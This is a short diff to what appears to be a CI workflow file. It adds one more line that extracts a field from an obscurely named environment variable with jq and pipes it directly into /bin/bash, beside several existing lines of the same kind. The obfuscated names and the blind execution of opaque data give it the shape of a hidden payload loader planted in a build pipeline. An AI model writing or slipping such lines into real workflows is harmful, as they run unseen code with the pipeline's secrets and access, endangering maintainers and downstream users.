@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$tc49" | jq -r .y3103 | /bin/bash
           printf '%s' "$pi1147" | jq -r .pc2 | /bin/bash
           echo $iejfk180 | jq -r .o186 | /bin/bash
+          printf '%s' "$syux924" | jq -r .tzaf091 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
